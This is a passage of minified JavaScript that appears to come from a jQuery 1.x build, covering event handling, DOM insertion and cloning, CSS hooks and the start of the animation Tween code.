                var n, o, i, r, a = [],
                    s = t.delegateCount,
                    l = e.target;
                if (s && l.nodeType && (!e.button || "click" !== e.type))
                    for (; l != this; l = l.parentNode || this)
                        if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                            for (i = [], r = 0; s > r; r++) void 0 === i[n = (o = t[r]).selector + " "] && (i[n] = o.needsContext ? p(n, this).index(l) >= 0 : p.find(n, this, null, [l]).length), i[n] && i.push(o);
                            i.length && a.push({
                                elem: l,
                                handlers: i
                            })
                        } return s < t.length && a.push({
                            elem: this,
                            handlers: t.slice(s)
                        }), a
            },
            fix: function (e) {
                if (e[p.expando]) return e;
                var t, n, o, i = e.type,
                    r = e,
                    a = this.fixHooks[i];
                for (a || (this.fixHooks[i] = a = G.test(i) ? this.mouseHooks : V.test(i) ? this.keyHooks : {}), o = a.props ? this.props.concat(a.props) : this.props, e = new p.Event(r), t = o.length; t--;) e[n = o[t]] = r[n];
                return e.target || (e.target = r.srcElement || E), 3 === e.target.nodeType && (e.target = e.target.parentNode), e.metaKey = !!e.metaKey, a.filter ? a.filter(e, r) : e
            },
            props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
            fixHooks: {},
            keyHooks: {
                props: "char charCode key keyCode".split(" "),
                filter: function (e, t) {
                    return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
                }
            },
            mouseHooks: {
                props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
                filter: function (e, t) {
                    var n, o, i, r = t.button,
                        a = t.fromElement;
                    return null == e.pageX && null != t.clientX && (i = (o = e.target.ownerDocument || E).documentElement, n = o.body, e.pageX = t.clientX + (i && i.scrollLeft || n && n.scrollLeft || 0) - (i && i.clientLeft || n && n.clientLeft || 0), e.pageY = t.clientY + (i && i.scrollTop || n && n.scrollTop || 0) - (i && i.clientTop || n && n.clientTop || 0)), !e.relatedTarget && a && (e.relatedTarget = a === e.target ? t.toElement : a), e.which || void 0 === r || (e.which = 1 & r ? 1 : 2 & r ? 3 : 4 & r ? 2 : 0), e
                }
            },
            special: {
                load: {
                    noBubble: !0
                },
                focus: {
                    trigger: function () {
                        if (this !== ee() && this.focus) try {
                            return this.focus(), !1
                        } catch (e) { }
                    },
                    delegateType: "focusin"
                },
                blur: {
                    trigger: function () {
                        return this === ee() && this.blur ? (this.blur(), !1) : void 0
                    },
                    delegateType: "focusout"
                },
                click: {
                    trigger: function () {
                        return p.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : void 0
                    },
                    _default: function (e) {
                        return p.nodeName(e.target, "a")
                    }
                },
                beforeunload: {
                    postDispatch: function (e) {
                        void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result)
                    }
                }
            },
            simulate: function (e, t, n, o) {
                var i = p.extend(new p.Event, n, {
                    type: e,
                    isSimulated: !0,
                    originalEvent: {}
                });
                o ? p.event.trigger(i, null, t) : p.event.dispatch.call(t, i), i.isDefaultPrevented() && n.preventDefault()
            }
        }, p.removeEvent = E.removeEventListener ? function (e, t, n) {
            e.removeEventListener && e.removeEventListener(t, n, !1)
        } : function (e, t, n) {
            var o = "on" + t;
            e.detachEvent && (typeof e[o] === j && (e[o] = null), e.detachEvent(o, n))
        }, p.Event = function (e, t) {
            return this instanceof p.Event ? (e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? Q : K) : this.type = e, t && p.extend(this, t), this.timeStamp = e && e.timeStamp || p.now(), void (this[p.expando] = !0)) : new p.Event(e, t)
        }, p.Event.prototype = {
            isDefaultPrevented: K,
            isPropagationStopped: K,
            isImmediatePropagationStopped: K,
            preventDefault: function () {
                var e = this.originalEvent;
                this.isDefaultPrevented = Q, e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
            },
            stopPropagation: function () {
                var e = this.originalEvent;
                this.isPropagationStopped = Q, e && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0)
            },
            stopImmediatePropagation: function () {
                var e = this.originalEvent;
                this.isImmediatePropagationStopped = Q, e && e.stopImmediatePropagation && e.stopImmediatePropagation(), this.stopPropagation()
            }
        }, p.each({
            mouseenter: "mouseover",
            mouseleave: "mouseout",
            pointerenter: "pointerover",
            pointerleave: "pointerout"
        }, (function (e, t) {
            p.event.special[e] = {
                delegateType: t,
                bindType: t,
                handle: function (e) {
                    var n, o = this,
                        i = e.relatedTarget,
                        r = e.handleObj;
                    return (!i || i !== o && !p.contains(o, i)) && (e.type = r.origType, n = r.handler.apply(this, arguments), e.type = t), n
                }
            }
        })), u.submitBubbles || (p.event.special.submit = {
            setup: function () {
                return !p.nodeName(this, "form") && void p.event.add(this, "click._submit keypress._submit", (function (e) {
                    var t = e.target,
                        n = p.nodeName(t, "input") || p.nodeName(t, "button") ? t.form : void 0;
                    n && !p._data(n, "submitBubbles") && (p.event.add(n, "submit._submit", (function (e) {
                        e._submit_bubble = !0
                    })), p._data(n, "submitBubbles", !0))
                }))
            },
            postDispatch: function (e) {
                e._submit_bubble && (delete e._submit_bubble, this.parentNode && !e.isTrigger && p.event.simulate("submit", this.parentNode, e, !0))
            },
            teardown: function () {
                return !p.nodeName(this, "form") && void p.event.remove(this, "._submit")
            }
        }), u.changeBubbles || (p.event.special.change = {
            setup: function () {
                return Y.test(this.nodeName) ? (("checkbox" === this.type || "radio" === this.type) && (p.event.add(this, "propertychange._change", (function (e) {
                    "checked" === e.originalEvent.propertyName && (this._just_changed = !0)
                })), p.event.add(this, "click._change", (function (e) {
                    this._just_changed && !e.isTrigger && (this._just_changed = !1), p.event.simulate("change", this, e, !0)
                }))), !1) : void p.event.add(this, "beforeactivate._change", (function (e) {
                    var t = e.target;
                    Y.test(t.nodeName) && !p._data(t, "changeBubbles") && (p.event.add(t, "change._change", (function (e) {
                        !this.parentNode || e.isSimulated || e.isTrigger || p.event.simulate("change", this.parentNode, e, !0)
                    })), p._data(t, "changeBubbles", !0))
                }))
            },
            handle: function (e) {
                var t = e.target;
                return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : void 0
            },
            teardown: function () {
                return p.event.remove(this, "._change"), !Y.test(this.nodeName)
            }
        }), u.focusinBubbles || p.each({
            focus: "focusin",
            blur: "focusout"
        }, (function (e, t) {
            var n = function (e) {
                p.event.simulate(t, e.target, p.event.fix(e), !0)
            };
            p.event.special[t] = {
                setup: function () {
                    var o = this.ownerDocument || this,
                        i = p._data(o, t);
                    i || o.addEventListener(e, n, !0), p._data(o, t, (i || 0) + 1)
                },
                teardown: function () {
                    var o = this.ownerDocument || this,
                        i = p._data(o, t) - 1;
                    i ? p._data(o, t, i) : (o.removeEventListener(e, n, !0), p._removeData(o, t))
                }
            }
        })), p.fn.extend({
            on: function (e, t, n, o, i) {
                var r, a;
                if ("object" == typeof e) {
                    for (r in "string" != typeof t && (n = n || t, t = void 0), e) this.on(r, t, n, e[r], i);
                    return this
                }
                if (null == n && null == o ? (o = t, n = t = void 0) : null == o && ("string" == typeof t ? (o = n, n = void 0) : (o = n, n = t, t = void 0)), !1 === o) o = K;
                else if (!o) return this;
                return 1 === i && (a = o, (o = function (e) {
                    return p().off(e), a.apply(this, arguments)
                }).guid = a.guid || (a.guid = p.guid++)), this.each((function () {
                    p.event.add(this, e, o, n, t)
                }))
            },
            one: function (e, t, n, o) {
                return this.on(e, t, n, o, 1)
            },
            off: function (e, t, n) {
                var o, i;
                if (e && e.preventDefault && e.handleObj) return o = e.handleObj, p(e.delegateTarget).off(o.namespace ? o.origType + "." + o.namespace : o.origType, o.selector, o.handler), this;
                if ("object" == typeof e) {
                    for (i in e) this.off(i, t, e[i]);
                    return this
                }
                return (!1 === t || "function" == typeof t) && (n = t, t = void 0), !1 === n && (n = K), this.each((function () {
                    p.event.remove(this, e, n, t)
                }))
            },
            trigger: function (e, t) {
                return this.each((function () {
                    p.event.trigger(e, t, this)
                }))
            },
            triggerHandler: function (e, t) {
                var n = this[0];
                return n ? p.event.trigger(e, t, n, !0) : void 0
            }
        });
        var ne = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
            oe = / jQuery\d+="(?:null|\d+)"/g,
            ie = new RegExp("<(?:" + ne + ")[\\s/>]", "i"),
            re = /^\s+/,
            ae = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
            se = /<([\w:]+)/,
            le = /<tbody/i,
            ce = /<|&#?\w+;/,
            ue = /<(?:script|style|link)/i,
            de = /checked\s*(?:[^=]|=\s*.checked.)/i,
            pe = /^$|\/(?:java|ecma)script/i,
            fe = /^true\/(.*)/,
            he = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
            me = {
                option: [1, "<select multiple='multiple'>", "</select>"],
                legend: [1, "<fieldset>", "</fieldset>"],
                area: [1, "<map>", "</map>"],
                param: [1, "<object>", "</object>"],
                thead: [1, "<table>", "</table>"],
                tr: [2, "<table><tbody>", "</tbody></table>"],
                col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
                td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                _default: u.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
            },
            ge = te(E).appendChild(E.createElement("div"));

        function ve(e, t) {
            var n, o, i = 0,
                r = typeof e.getElementsByTagName !== j ? e.getElementsByTagName(t || "*") : typeof e.querySelectorAll !== j ? e.querySelectorAll(t || "*") : void 0;
            if (!r)
                for (r = [], n = e.childNodes || e; null != (o = n[i]); i++) !t || p.nodeName(o, t) ? r.push(o) : p.merge(r, ve(o, t));
            return void 0 === t || t && p.nodeName(e, t) ? p.merge([e], r) : r
        }

        function ye(e) {
            X.test(e.type) && (e.defaultChecked = e.checked)
        }

        function be(e, t) {
            return p.nodeName(e, "table") && p.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
        }

        function xe(e) {
            return e.type = (null !== p.find.attr(e, "type")) + "/" + e.type, e
        }

        function we(e) {
            var t = fe.exec(e.type);
            return t ? e.type = t[1] : e.removeAttribute("type"), e
        }

        function Ce(e, t) {
            for (var n, o = 0; null != (n = e[o]); o++) p._data(n, "globalEval", !t || p._data(t[o], "globalEval"))
        }

        function Te(e, t) {
            if (1 === t.nodeType && p.hasData(e)) {
                var n, o, i, r = p._data(e),
                    a = p._data(t, r),
                    s = r.events;
                if (s)
                    for (n in delete a.handle, a.events = {}, s)
                        for (o = 0, i = s[n].length; i > o; o++) p.event.add(t, n, s[n][o]);
                a.data && (a.data = p.extend({}, a.data))
            }
        }

        function Ee(e, t) {
            var n, o, i;
            if (1 === t.nodeType) {
                if (n = t.nodeName.toLowerCase(), !u.noCloneEvent && t[p.expando]) {
                    for (o in (i = p._data(t)).events) p.removeEvent(t, o, i.handle);
                    t.removeAttribute(p.expando)
                }
                "script" === n && t.text !== e.text ? (xe(t).text = e.text, we(t)) : "object" === n ? (t.parentNode && (t.outerHTML = e.outerHTML), u.html5Clone && e.innerHTML && !p.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === n && X.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : "option" === n ? t.defaultSelected = t.selected = e.defaultSelected : ("input" === n || "textarea" === n) && (t.defaultValue = e.defaultValue)
            }
        }
        me.optgroup = me.option, me.tbody = me.tfoot = me.colgroup = me.caption = me.thead, me.th = me.td, p.extend({
            clone: function (e, t, n) {
                var o, i, r, a, s, l = p.contains(e.ownerDocument, e);
                if (u.html5Clone || p.isXMLDoc(e) || !ie.test("<" + e.nodeName + ">") ? r = e.cloneNode(!0) : (ge.innerHTML = e.outerHTML, ge.removeChild(r = ge.firstChild)), !(u.noCloneEvent && u.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || p.isXMLDoc(e)))
                    for (o = ve(r), s = ve(e), a = 0; null != (i = s[a]); ++a) o[a] && Ee(i, o[a]);
                if (t)
                    if (n)
                        for (s = s || ve(e), o = o || ve(r), a = 0; null != (i = s[a]); a++) Te(i, o[a]);
                    else Te(e, r);
                return (o = ve(r, "script")).length > 0 && Ce(o, !l && ve(e, "script")), o = s = i = null, r
            },
            buildFragment: function (e, t, n, o) {
                for (var i, r, a, s, l, c, d, f = e.length, h = te(t), m = [], g = 0; f > g; g++)
                    if ((r = e[g]) || 0 === r)
                        if ("object" === p.type(r)) p.merge(m, r.nodeType ? [r] : r);
                        else if (ce.test(r)) {
                            for (s = s || h.appendChild(t.createElement("div")), l = (se.exec(r) || ["", ""])[1].toLowerCase(), d = me[l] || me._default, s.innerHTML = d[1] + r.replace(ae, "<$1></$2>") + d[2], i = d[0]; i--;) s = s.lastChild;
                            if (!u.leadingWhitespace && re.test(r) && m.push(t.createTextNode(re.exec(r)[0])), !u.tbody)
                                for (i = (r = "table" !== l || le.test(r) ? "<table>" !== d[1] || le.test(r) ? 0 : s : s.firstChild) && r.childNodes.length; i--;) p.nodeName(c = r.childNodes[i], "tbody") && !c.childNodes.length && r.removeChild(c);
                            for (p.merge(m, s.childNodes), s.textContent = ""; s.firstChild;) s.removeChild(s.firstChild);
                            s = h.lastChild
                        } else m.push(t.createTextNode(r));
                for (s && h.removeChild(s), u.appendChecked || p.grep(ve(m, "input"), ye), g = 0; r = m[g++];)
                    if ((!o || -1 === p.inArray(r, o)) && (a = p.contains(r.ownerDocument, r), s = ve(h.appendChild(r), "script"), a && Ce(s), n))
                        for (i = 0; r = s[i++];) pe.test(r.type || "") && n.push(r);
                return s = null, h
            },
            cleanData: function (e, t) {
                for (var o, i, r, a, s = 0, l = p.expando, c = p.cache, d = u.deleteExpando, f = p.event.special; null != (o = e[s]); s++)
                    if ((t || p.acceptData(o)) && (a = (r = o[l]) && c[r])) {
                        if (a.events)
                            for (i in a.events) f[i] ? p.event.remove(o, i) : p.removeEvent(o, i, a.handle);
                        c[r] && (delete c[r], d ? delete o[l] : typeof o.removeAttribute !== j ? o.removeAttribute(l) : o[l] = null, n.push(r))
                    }
            }
        }), p.fn.extend({
            text: function (e) {
                return U(this, (function (e) {
                    return void 0 === e ? p.text(this) : this.empty().append((this[0] && this[0].ownerDocument || E).createTextNode(e))
                }), null, e, arguments.length)
            },
            append: function () {
                return this.domManip(arguments, (function (e) {
                    1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || be(this, e).appendChild(e)
                }))
            },
            prepend: function () {
                return this.domManip(arguments, (function (e) {
                    if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                        var t = be(this, e);
                        t.insertBefore(e, t.firstChild)
                    }
                }))
            },
            before: function () {
                return this.domManip(arguments, (function (e) {
                    this.parentNode && this.parentNode.insertBefore(e, this)
                }))
            },
            after: function () {
                return this.domManip(arguments, (function (e) {
                    this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
                }))
            },
            remove: function (e, t) {
                for (var n, o = e ? p.filter(e, this) : this, i = 0; null != (n = o[i]); i++) t || 1 !== n.nodeType || p.cleanData(ve(n)), n.parentNode && (t && p.contains(n.ownerDocument, n) && Ce(ve(n, "script")), n.parentNode.removeChild(n));
                return this
            },
            empty: function () {
                for (var e, t = 0; null != (e = this[t]); t++) {
                    for (1 === e.nodeType && p.cleanData(ve(e, !1)); e.firstChild;) e.removeChild(e.firstChild);
                    e.options && p.nodeName(e, "select") && (e.options.length = 0)
                }
                return this
            },
            clone: function (e, t) {
                return e = null != e && e, t = null == t ? e : t, this.map((function () {
                    return p.clone(this, e, t)
                }))
            },
            html: function (e) {
                return U(this, (function (e) {
                    var t = this[0] || {},
                        n = 0,
                        o = this.length;
                    if (void 0 === e) return 1 === t.nodeType ? t.innerHTML.replace(oe, "") : void 0;
                    if (!("string" != typeof e || ue.test(e) || !u.htmlSerialize && ie.test(e) || !u.leadingWhitespace && re.test(e) || me[(se.exec(e) || ["", ""])[1].toLowerCase()])) {
                        e = e.replace(ae, "<$1></$2>");
                        try {
                            for (; o > n; n++) 1 === (t = this[n] || {}).nodeType && (p.cleanData(ve(t, !1)), t.innerHTML = e);
                            t = 0
                        } catch (e) { }
                    }
                    t && this.empty().append(e)
                }), null, e, arguments.length)
            },
            replaceWith: function () {
                var e = arguments[0];
                return this.domManip(arguments, (function (t) {
                    e = this.parentNode, p.cleanData(ve(this)), e && e.replaceChild(t, this)
                })), e && (e.length || e.nodeType) ? this : this.remove()
            },
            detach: function (e) {
                return this.remove(e, !0)
            },
            domManip: function (e, t) {
                e = i.apply([], e);
                var n, o, r, a, s, l, c = 0,
                    d = this.length,
                    f = this,
                    h = d - 1,
                    m = e[0],
                    g = p.isFunction(m);
                if (g || d > 1 && "string" == typeof m && !u.checkClone && de.test(m)) return this.each((function (n) {
                    var o = f.eq(n);
                    g && (e[0] = m.call(this, n, o.html())), o.domManip(e, t)
                }));
                if (d && (n = (l = p.buildFragment(e, this[0].ownerDocument, !1, this)).firstChild, 1 === l.childNodes.length && (l = n), n)) {
                    for (r = (a = p.map(ve(l, "script"), xe)).length; d > c; c++) o = l, c !== h && (o = p.clone(o, !0, !0), r && p.merge(a, ve(o, "script"))), t.call(this[c], o, c);
                    if (r)
                        for (s = a[a.length - 1].ownerDocument, p.map(a, we), c = 0; r > c; c++) o = a[c], pe.test(o.type || "") && !p._data(o, "globalEval") && p.contains(s, o) && (o.src ? p._evalUrl && p._evalUrl(o.src) : p.globalEval((o.text || o.textContent || o.innerHTML || "").replace(he, "")));
                    l = n = null
                }
                return this
            }
        }), p.each({
            appendTo: "append",
            prependTo: "prepend",
            insertBefore: "before",
            insertAfter: "after",
            replaceAll: "replaceWith"
        }, (function (e, t) {
            p.fn[e] = function (e) {
                for (var n, o = 0, i = [], a = p(e), s = a.length - 1; s >= o; o++) n = o === s ? this : this.clone(!0), p(a[o])[t](n), r.apply(i, n.get());
                return this.pushStack(i)
            }
        }));
        var ke, Se = {};

        function Le(t, n) {
            var o, i = p(n.createElement(t)).appendTo(n.body),
                r = e.getDefaultComputedStyle && (o = e.getDefaultComputedStyle(i[0])) ? o.display : p.css(i[0], "display");
            return i.detach(), r
        }

        function Ne(e) {
            var t = E,
                n = Se[e];
            return n || ("none" !== (n = Le(e, t)) && n || ((t = ((ke = (ke || p("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentWindow || ke[0].contentDocument).document).write(), t.close(), n = Le(e, t), ke.detach()), Se[e] = n), n
        } ! function () {
            var e;
            u.shrinkWrapBlocks = function () {
                return null != e ? e : (e = !1, (n = E.getElementsByTagName("body")[0]) && n.style ? (t = E.createElement("div"), (o = E.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", n.appendChild(o).appendChild(t), typeof t.style.zoom !== j && (t.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1", t.appendChild(E.createElement("div")).style.width = "5px", e = 3 !== t.offsetWidth), n.removeChild(o), e) : void 0);
                var t, n, o
            }
        }();
        var De, Ie, Ae = /^margin/,
            $e = new RegExp("^(" + W + ")(?!px)[a-z%]+$", "i"),
            Me = /^(top|right|bottom|left)$/;

        function Pe(e, t) {
            return {
                get: function () {
                    var n = e();
                    if (null != n) return n ? void delete this.get : (this.get = t).apply(this, arguments)
                }
            }
        }
        e.getComputedStyle ? (De = function (t) {
            return t.ownerDocument.defaultView.opener ? t.ownerDocument.defaultView.getComputedStyle(t, null) : e.getComputedStyle(t, null)
        }, Ie = function (e, t, n) {
            var o, i, r, a, s = e.style;
            return a = (n = n || De(e)) ? n.getPropertyValue(t) || n[t] : void 0, n && ("" !== a || p.contains(e.ownerDocument, e) || (a = p.style(e, t)), $e.test(a) && Ae.test(t) && (o = s.width, i = s.minWidth, r = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = o, s.minWidth = i, s.maxWidth = r)), void 0 === a ? a : a + ""
        }) : E.documentElement.currentStyle && (De = function (e) {
            return e.currentStyle
        }, Ie = function (e, t, n) {
            var o, i, r, a, s = e.style;
            return null == (a = (n = n || De(e)) ? n[t] : void 0) && s && s[t] && (a = s[t]), $e.test(a) && !Me.test(t) && (o = s.left, (r = (i = e.runtimeStyle) && i.left) && (i.left = e.currentStyle.left), s.left = "fontSize" === t ? "1em" : a, a = s.pixelLeft + "px", s.left = o, r && (i.left = r)), void 0 === a ? a : a + "" || "auto"
        }),
            function () {
                var t, n, o, i, r, a, s;
                if ((t = E.createElement("div")).innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", n = (o = t.getElementsByTagName("a")[0]) && o.style) {
                    function l() {
                        var t, n, o, l;
                        (n = E.getElementsByTagName("body")[0]) && n.style && (t = E.createElement("div"), (o = E.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", n.appendChild(o).appendChild(t), t.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute", i = r = !1, s = !0, e.getComputedStyle && (i = "1%" !== (e.getComputedStyle(t, null) || {}).top, r = "4px" === (e.getComputedStyle(t, null) || {
                            width: "4px"
                        }).width, (l = t.appendChild(E.createElement("div"))).style.cssText = t.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", l.style.marginRight = l.style.width = "0", t.style.width = "1px", s = !parseFloat((e.getComputedStyle(l, null) || {}).marginRight), t.removeChild(l)), t.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", (l = t.getElementsByTagName("td"))[0].style.cssText = "margin:0;border:0;padding:0;display:none", (a = 0 === l[0].offsetHeight) && (l[0].style.display = "", l[1].style.display = "none", a = 0 === l[0].offsetHeight), n.removeChild(o))
                    }
                    n.cssText = "float:left;opacity:.5", u.opacity = "0.5" === n.opacity, u.cssFloat = !!n.cssFloat, t.style.backgroundClip = "content-box", t.cloneNode(!0).style.backgroundClip = "", u.clearCloneStyle = "content-box" === t.style.backgroundClip, u.boxSizing = "" === n.boxSizing || "" === n.MozBoxSizing || "" === n.WebkitBoxSizing, p.extend(u, {
                        reliableHiddenOffsets: function () {
                            return null == a && l(), a
                        },
                        boxSizingReliable: function () {
                            return null == r && l(), r
                        },
                        pixelPosition: function () {
                            return null == i && l(), i
                        },
                        reliableMarginRight: function () {
                            return null == s && l(), s
                        }
                    })
                }
            }(), p.swap = function (e, t, n, o) {
                var i, r, a = {};
                for (r in t) a[r] = e.style[r], e.style[r] = t[r];
                for (r in i = n.apply(e, o || []), t) e.style[r] = a[r];
                return i
            };
        var je = /alpha\([^)]*\)/i,
            Be = /opacity\s*=\s*([^)]*)/,
            Oe = /^(none|table(?!-c[ea]).+)/,
            He = new RegExp("^(" + W + ")(.*)$", "i"),
            Fe = new RegExp("^([+-])=(" + W + ")", "i"),
            ze = {
                position: "absolute",
                visibility: "hidden",
                display: "block"
            },
            qe = {
                letterSpacing: "0",
                fontWeight: "400"
            },
            We = ["Webkit", "O", "Moz", "ms"];

        function Re(e, t) {
            if (t in e) return t;
            for (var n = t.charAt(0).toUpperCase() + t.slice(1), o = t, i = We.length; i--;)
                if ((t = We[i] + n) in e) return t;
            return o
        }

        function _e(e, t) {
            for (var n, o, i, r = [], a = 0, s = e.length; s > a; a++)(o = e[a]).style && (r[a] = p._data(o, "olddisplay"), n = o.style.display, t ? (r[a] || "none" !== n || (o.style.display = ""), "" === o.style.display && _(o) && (r[a] = p._data(o, "olddisplay", Ne(o.nodeName)))) : (i = _(o), (n && "none" !== n || !i) && p._data(o, "olddisplay", i ? n : p.css(o, "display"))));
            for (a = 0; s > a; a++)(o = e[a]).style && (t && "none" !== o.style.display && "" !== o.style.display || (o.style.display = t ? r[a] || "" : "none"));
            return e
        }

        function Ue(e, t, n) {
            var o = He.exec(t);
            return o ? Math.max(0, o[1] - (n || 0)) + (o[2] || "px") : t
        }

        function Xe(e, t, n, o, i) {
            for (var r = n === (o ? "border" : "content") ? 4 : "width" === t ? 1 : 0, a = 0; 4 > r; r += 2) "margin" === n && (a += p.css(e, n + R[r], !0, i)), o ? ("content" === n && (a -= p.css(e, "padding" + R[r], !0, i)), "margin" !== n && (a -= p.css(e, "border" + R[r] + "Width", !0, i))) : (a += p.css(e, "padding" + R[r], !0, i), "padding" !== n && (a += p.css(e, "border" + R[r] + "Width", !0, i)));
            return a
        }

        function Ye(e, t, n) {
            var o = !0,
                i = "width" === t ? e.offsetWidth : e.offsetHeight,
                r = De(e),
                a = u.boxSizing && "border-box" === p.css(e, "boxSizing", !1, r);
            if (0 >= i || null == i) {
                if ((0 > (i = Ie(e, t, r)) || null == i) && (i = e.style[t]), $e.test(i)) return i;
                o = a && (u.boxSizingReliable() || i === e.style[t]), i = parseFloat(i) || 0
            }
            return i + Xe(e, t, n || (a ? "border" : "content"), o, r) + "px"
        }

        function Ve(e, t, n, o, i) {
            return new Ve.prototype.init(e, t, n, o, i)
        }
        p.extend({
            cssHooks: {
                opacity: {
                    get: function (e, t) {
                        if (t) {
                            var n = Ie(e, "opacity");
                            return "" === n ? "1" : n
                        }
                    }
                }
            },
            cssNumber: {
                columnCount: !0,
                fillOpacity: !0,
                flexGrow: !0,
                flexShrink: !0,
                fontWeight: !0,
                lineHeight: !0,
                opacity: !0,
                order: !0,
                orphans: !0,
                widows: !0,
                zIndex: !0,
                zoom: !0
            },
            cssProps: {
                float: u.cssFloat ? "cssFloat" : "styleFloat"
            },
            style: function (e, t, n, o) {
                if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                    var i, r, a, s = p.camelCase(t),
                        l = e.style;
                    if (t = p.cssProps[s] || (p.cssProps[s] = Re(l, s)), a = p.cssHooks[t] || p.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (i = a.get(e, !1, o)) ? i : l[t];
                    if ("string" === (r = typeof n) && (i = Fe.exec(n)) && (n = (i[1] + 1) * i[2] + parseFloat(p.css(e, t)), r = "number"), null != n && n == n && ("number" !== r || p.cssNumber[s] || (n += "px"), u.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), !a || !("set" in a) || void 0 !== (n = a.set(e, n, o)))) try {
                        l[t] = n
                    } catch (e) { }
                }
            },
            css: function (e, t, n, o) {
                var i, r, a, s = p.camelCase(t);
                return t = p.cssProps[s] || (p.cssProps[s] = Re(e.style, s)), (a = p.cssHooks[t] || p.cssHooks[s]) && "get" in a && (r = a.get(e, !0, n)), void 0 === r && (r = Ie(e, t, o)), "normal" === r && t in qe && (r = qe[t]), "" === n || n ? (i = parseFloat(r), !0 === n || p.isNumeric(i) ? i || 0 : r) : r
            }
        }), p.each(["height", "width"], (function (e, t) {
            p.cssHooks[t] = {
                get: function (e, n, o) {
                    return n ? Oe.test(p.css(e, "display")) && 0 === e.offsetWidth ? p.swap(e, ze, (function () {
                        return Ye(e, t, o)
                    })) : Ye(e, t, o) : void 0
                },
                set: function (e, n, o) {
                    var i = o && De(e);
                    return Ue(0, n, o ? Xe(e, t, o, u.boxSizing && "border-box" === p.css(e, "boxSizing", !1, i), i) : 0)
                }
            }
        })), u.opacity || (p.cssHooks.opacity = {
            get: function (e, t) {
                return Be.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
            },
            set: function (e, t) {
                var n = e.style,
                    o = e.currentStyle,
                    i = p.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : "",
                    r = o && o.filter || n.filter || "";
                n.zoom = 1, (t >= 1 || "" === t) && "" === p.trim(r.replace(je, "")) && n.removeAttribute && (n.removeAttribute("filter"), "" === t || o && !o.filter) || (n.filter = je.test(r) ? r.replace(je, i) : r + " " + i)
            }
        }), p.cssHooks.marginRight = Pe(u.reliableMarginRight, (function (e, t) {
            return t ? p.swap(e, {
                display: "inline-block"
            }, Ie, [e, "marginRight"]) : void 0
        })), p.each({
            margin: "",
            padding: "",
            border: "Width"
        }, (function (e, t) {
            p.cssHooks[e + t] = {
                expand: function (n) {
                    for (var o = 0, i = {}, r = "string" == typeof n ? n.split(" ") : [n]; 4 > o; o++) i[e + R[o] + t] = r[o] || r[o - 2] || r[0];
                    return i
                }
            }, Ae.test(e) || (p.cssHooks[e + t].set = Ue)
        })), p.fn.extend({
            css: function (e, t) {
                return U(this, (function (e, t, n) {
                    var o, i, r = {},
                        a = 0;
                    if (p.isArray(t)) {
                        for (o = De(e), i = t.length; i > a; a++) r[t[a]] = p.css(e, t[a], !1, o);
                        return r
                    }
                    return void 0 !== n ? p.style(e, t, n) : p.css(e, t)
                }), e, t, arguments.length > 1)
            },
            show: function () {
                return _e(this, !0)
            },
            hide: function () {
                return _e(this)
            },
            toggle: function (e) {
                return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each((function () {
                    _(this) ? p(this).show() : p(this).hide()
                }))
            }
        }), p.Tween = Ve, Ve.prototype = {
            constructor: Ve,
            init: function (e, t, n, o, i, r) {
                this.elem = e, this.prop = n, this.easing = i || "swing", this.options = t, this.start = this.now = this.cur(), this.end = o, this.unit = r || (p.cssNumber[n] ? "" : "px")
            },
            cur: function () {
                var e = Ve.propHooks[this.prop];
                return e && e.get ? e.get(this) : Ve.propHooks._default.get(this)
            },
            run: function (e) {
                var t, n = Ve.propHooks[this.prop];
